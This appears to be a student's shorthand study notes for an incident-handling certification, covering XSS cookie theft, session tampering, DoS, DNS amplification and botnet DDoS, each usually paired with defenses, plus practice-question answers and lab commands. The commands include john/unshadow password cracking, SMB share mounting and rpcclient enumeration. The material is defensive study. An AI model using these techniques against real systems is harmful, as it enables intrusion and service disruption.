attkr input browser script + app logs this input 
admin views the app logs + malcode runs (steals cookies)
could alter app using admin creds + add new attkr admin acct
DEFENSES: [P] rm user input char (=<>();&) server side, filter quotes, semicolons, asterisks, percent, underscore, other shell metachar, delete/enc from site output, modSecurity, best= define ok chars, [P for client] disable script/browser fts to ctrl script, NoScript FFox ext, selective allow plugins via trusted cert site, anti-XSS, sus activity, IE8 include built-in XSS filter, JS in URLs/HTTP POST vars, [P for Server] limit cookie access w/ HttpOnly flag, set Content Security Policy, browser can report to specific URL if attkd, [I] IDS/logs with scripts, enc info (hex/unicode), [C] filter in data, [E] rm attkr data, [R] contact anti-fraud group
	
Attack WebApp State Maint: url sesh track + hidden form elements + cookies
“hold this, give it back to me for all future interactions”
atkr browser > proxy > internet > web app
edit raw http/https within proxy (burp/fiddler/zap)
cover entire app
web app enc/hash cloned ID > attkr can access app as another user

DEFENSES: [P] use proxy, WAF, monitor elements + in data to/from web app, secureSphere WAF, Citrix netscaler FW, F5 ASM, modSecurity, [I] users complain acct usurpation, [C] advise shutdown app while fix, quarantine victim acc, [E] rm attkr data from victim acct, [R] restore/reset pwd+monitor accs 

DOS: deny legit user from service 
Local Dos
1>crash service via stop proc
2>tie up sys resources
consume cpu cycles, mem space, HDD space, etc CpuHog
Network Dos	
1>malformed packet flood: send single/small packet formed in wrong way
too long, Ping of Death, strange fragmented aka TearDrop attack
2>packet flood: send a lot of packets to exhaust all bandwidth of cnx to tgt
			

DNS Amplification: small spoofed DNS query to several DNS servers
does not involve broadcast addr
query dns + dns sends larger response back to addr tht looks like it made request
results in traffic flood to tgt
DNS is UDP - spoofing is trivial 
EDNS: dns qry can specify a larger buffer (<512b) for response
find several DNS server w/ recursive lookups 
attkr qry those servers for attkr owned DNS
attkr respond to qry w/ 4k byte TXT record
w/ poisoned cache, attkr spoofs DNS req for record w/ tgt src IP
flood victim

DDOS: many comp pc via botnet (past used Tribe Flood Network 2000)
attkr can set nc relays to obscure origin
client pc sends cmds to bots via IRC channel
Reflected DDOS: attkr bounce flood from botnet>victim
bots send SYN to legit site (core router etc)
legit site sends SYN-ACK to flood victim
difficult to trace
they think the high bandwidth site is doing the attacking
	
Pulsing Zombies, bots flood tgt shortly (mins), then dormant 
tracing active attk easy, dormant=difficult 
Evolution: SYN > HTTP floods
SYN: typical spoof + suck up b/width + easy ISP trace
HTTP: full 3way handshake + send HTTP GET for common pg (index.html)
harder to see from normal traffic
LOIC: low orbit ion cannon + TCP/UDP/HTTP floods 
HOIC: high orbit: easy+ multithreaded+quick+customize JScripts for +boosters

DEFENSES: [P] host IDS/IPS, patch, AV, egress antispoof filters, critical biz sys w/ redundancy, [I] chk mass flood packets, automate DDOS/throttle tools (peakflow, riverbed, neustar, cloudflare), [C] IR marshal of ISP



TOOLS: THC Hydra, RainbowCrack, CrackStation, pbkdf2, bcrypt, scrypt, Argon2, john the ripper, hashcat, fgdump, win cred editor (WCE), mod SAMBA code, msf psexec + psexec_psh mods, Burp, OWASP, WebGoat, ZAP, AppSec Wiki Project, Zap proxy, burp, w3af, fiddler, TFN, TFN2k, LOIC,HOIC


Step 5: Cover Tracks - GOAL: stay hidden
DEFENSES: live with it



[switch compare MAC with DHCP assignments]:
dynamic ARP inspection or ARP security in order to prevent the opportunity for attackers to assume the IP address of trusted clients.  
switch can compare any MAC address that traverses the device with the known table of DHCP assignments.  
Any traffic that is a mismatch will be dropped by the switch.

[getting user to reauth to internal servers]:
Inject crafted RESET packets with the clients' and servers' IP addresses
 use crafted RESET packets to drop a connection, forcing victims into setting up a connection again
likely reauth, giving chance to grab auth information.

[Loki]
Loki is a tunneling tool that should be thought of as telnet over (ICMP). It can also use (UDP) port 53 to disguise (DNS) traffic.




[rtkt defense]
no way to know it is truly gone
minimum reformat the hard drive before anything else

[rtkt detect]
reliable=install a file integrity checker program like Tripwire or AIDE before a system is put on the network, create a db of sig stored off-line in read-only format. Then integrity checker periodically to recreate the signatures of the files and compare them against the off-line database of signatures to determine if a file was changed.

[mount share win]
admin cmd:
C:\> net use  \\[targetIP]\[share] [password] /u:[user]


[disagree with incident events or say you disagree]
strong disagreement about facts = can remain a part of the incident record. 

[protect vnc via ssh]
SSH connection encrypt the cnx end-to-end, protecting against the attack.

[why IRC is popular]
IRC channels allow for one-to-many communication

[dos attack:syn flood]
exhaust the connection queue of the victim, or suck up all link capacity. can be exhausted by too many half-open connections. 

[handle compd’ extranet web server]
best approach is to reroute DNS to another server. watch his actions while isolating users from the compromised server.

[3way handshake]
Step 1: Host A sends SYN packet to Host B.
Step 2: Host B responds with a SYN-ACK packet to Host A.
Step 3: Host A responds to Host B with an ACK packet.
NOTE:
SYN packets = synchronization.
ACK packets = acknowledgement.
PUSH packets = data > TCP stack.


[containment phase]
create rules to block traffic from an attack that's happening now.

[attkr vs account lockout= pwd spray]
testing their guessed passwords - password spraying. 

[nmap host discovery requests -  information request host discovery scans ]
In addition to ICMP echo request (Type 8), Systems reply to timestamp request, information request, and/or address mask request packets are up and available. 
No TCP packets are generated by these types of host discovery scans, so illegal TCP flags would not be detected. 
Timestamp and information request host discovery will not slow the rate of scanning as compared to echo requests.

[helpdesk-gather virus details + log tkt]
assist by gathering information from the users and logging it into a ticketing system.

[network mapping defense]
ICMP coming from a hostile network (such as the Internet) can be dropped. 

[cold calls from updated WHOIS contact]
remove the number and put a generic email address. 

[google search useful for phish/spoof]
"link:www.[target_company].com" for all sites that link to the target.

[resistant protocol to session hijack]
SSH due to the encrypted session and use of current or recent versions of the protocol.  

[ACK scan into network]
An ACK scan is particularly useful in getting through simple router-based firewalls. 
If a router allows "established" connections in (and is not using any stateful inspection), an attacker can use ACK scans to send packets into the network.
A border device (fireweall, advanced router, etc.) that requires state for inbound connections will be definition drop inbound packets with the ACK flag, negating the effectiveness of an ACK scan.
A web-proxy that only allows outbound connections will ignore an ACK scan. 
An IDS connected to a mirror port does not have an IP address to target with an ACK scan nor is there anything "behind the IDS" to map.




[ss: bunch of arp request=event can be misconfig]
anomalous behavior is classified as an event.

[unix system log default format]
ASCII format

[msf bypass DEP defenses]
Return-Oriented Programming (ROP) changing RP so programs ex existing  OS libs instead of new code.

[protect ARP table/cache=hard-code ARP]
sensitive net (DMZ) hard-coding your ARP tables. specific IP-to-MAC address map, defense grat ARP

[DLP breach + planning to write rules/monitor attacker]
containment phase 

[find ADS]
LADS tool

[best change to minimize mistakes during IR]
proper procedures in place. 

[team worried unqualified people in their system = get qualified]
Handlers with experience accessing the systems will alleviate the worries 

Labs Notes:
[1] john to crack pwds:

$ su - 
# cd /home/tools/john/
# tail /root/john_files/passwd_*
# ./unshadow /root/john_files/passwd_b /root/john_files/shadow_b > target_b
# ./john ./target_b


[3] version of service/sendmail:
nc+grab banner OR nmap -A 127.0.0.1
$ Nc 127.0.0.1 135 
$ nmap -A 127.0.0.1


[4]: [attkr written exe= SUID exe]
cmd were looking for files with 4001 permissions.  
4 represents SUID root and the 1 represents executable.  attacker is 
trying to get syntax right.  
SUID files for priv esc exploits; root sh.  

[5] find RID:
rpcclient 192.168.0.1 -U TargetPerson
rpcclient> enumalsgroups builtin

[6] find ADS 
dir /R
or
c:> dir /r C:\Users\Jessica\Download

[7] find cmd line/argu for a srv on port:
admin cmd:
> netstat -noab | find "135"
> wmic process where processid=PID get commandline


[8] find the startup for a process for user nt auth\nt service
admin cmd:
C:> wmic startup list full


[9] compare arp table vs inventory:
$ cat /home/student/arp.out will display the arp table.
$ cat -v /home/student/asset_inventory.csv will display the inventory table
file explorer; open in an editor + easier to compare.


[sk:  insider threat or mal doc]
Insider Threat either under Casual - Non-destructive threat (for forwarding the email) or Intentional - Non-destructive (for selling corporate secrets) threat category. 


[sk: sniffing on switch]
broadcast packets and packets destined for that specific host - 
only send data to needed port on switch.

[sk: tcp easier to detect than ack,syn, etc]
more overhead= packets +time
SYN, ACK, FIN scans are stealthy 
Connect TCP scans slow and easy to detect because there are 3 packets used in the handshake..
establishes a cnx, other scan types don't.

[sk; nmap scan evade FW]
ACK & FIN two are commonly used to evade firewalls

[sk: server respond when client sends initial packet in covert_channel seq mode]
always respond with a RST packet


